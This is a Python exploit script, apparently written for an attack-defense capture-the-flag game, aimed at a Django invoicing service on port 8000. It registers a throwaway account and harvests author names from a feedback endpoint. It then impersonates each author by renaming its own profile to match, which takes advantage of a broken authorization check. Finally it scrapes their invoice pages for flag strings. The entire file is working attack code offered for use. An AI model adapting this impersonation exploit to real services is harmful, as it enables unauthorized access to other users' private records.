#!/usr/bin/python3

import requests
import sys
from bs4 import BeautifulSoup
import random
import string
import json
import re
import time

def rndf():
    return "".join(random.choice(string.ascii_uppercase) for _ in range(5))


HOST = sys.argv[1]
s = requests.Session()
url = f"http://{HOST}:8000/register"

headers = {
    "accept": "text/html,application/xhtml+xml,application/xml",
    "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",
}

response = s.get(url, headers=headers, verify=False)
time.sleep(1)
soup = BeautifulSoup(response.text, "html")
csrf_token = soup.select_one('input[name="csrfmiddlewaretoken"]')
token = str(csrf_token)[55:-3]
headers["cookie"] = "; ".join([x.name + "=" + x.value for x in response.cookies])

headers["content-type"] = "application/x-www-form-urlencoded"

rnd = rndf()
reg_data = f"csrfmiddlewaretoken={token}&username={rnd}&email={rnd}@anfak1ito.com&password1={rnd}&password2={rnd}"

response = s.post(url, data=reg_data, headers=headers)
time.sleep(1)
id = s.cookies.get_dict()["sessionid"]
# headers['cookie'] = '; '.join([x.name + '=' + x.value for x in response.cookies])
headers["cookie"] += "; sessionid=" + id

url = f"http://{HOST}:8000"
r = s.get(url + "/feedback_json")
time.sleep(1)
users = json.loads(r.text)
r = s.get(url + "/modify_user")
soup = BeautifulSoup(r.text, "html")
csrf_token = soup.select_one('input[name="csrfmiddlewaretoken"]')
token = str(csrf_token)[55:-3]
for i in users.values():
    for user in i:
        try:
            firstname = user["author"]
            lastname = firstname.split()[1]
            firstname = firstname.split()[0]
            r = s.post(
               url + "/modify_user",
               data={
                   "csrfmiddlewaretoken": token,
                   "first_name": firstname + " ",
                   "last_name": lastname + " ",
               },
            )
            time.sleep(1)
        except Exception:
           continue
        r = s.get(url + "/invoices")
        soup = BeautifulSoup(r.text, "html")
        links = soup.findAll("a")
        time.sleep(1)
        for link in links:
            if "invoice/" in str(link):
                invoice = link["href"]
                response = s.get(url + invoice)
                time.sleep(1)
                compiled = re.compile(r"SAAR\{[A-Za-z0-9-_]{32}\}")
                flags = compiled.findall(response.text)
                for flag in flags:
                    print(flag, flush=True)
        r = s.get(url + "/modify_user")
        time.sleep(1)
        soup = BeautifulSoup(r.text, "html")
        csrf_token = soup.select_one('input[name="csrfmiddlewaretoken"]')
        token = str(csrf_token)[55:-3]
